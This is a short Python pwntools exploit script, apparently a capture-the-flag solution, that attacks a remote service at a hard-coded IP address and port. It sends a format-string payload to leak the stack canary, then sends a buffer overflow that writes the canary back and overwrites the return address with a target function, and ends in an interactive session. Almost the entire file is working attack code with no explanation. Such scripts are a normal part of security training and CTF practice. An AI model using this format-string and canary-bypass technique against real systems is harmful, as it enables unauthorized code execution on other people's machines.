#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# 

#e = ELF('')
#l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

magic = 0x4008de

host , port = '146.185.132.36' , 19153
y = remote( host , port )

#%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.!!!!%p!!!

y.recvuntil('battle')
y.sendline('2')
y.sendline( '%p.' * 22 + 'yuawn%p' )
y.recvuntil('yuawn')
canary = int( y.recvline() , 16 )
log.info( hex( canary ) )

p = 'D' * 0x88
p += flat(
    canary,
    'RBBBBBBP',
    magic
)

y.sendline('1')

y.sendline(p)

y.interactive()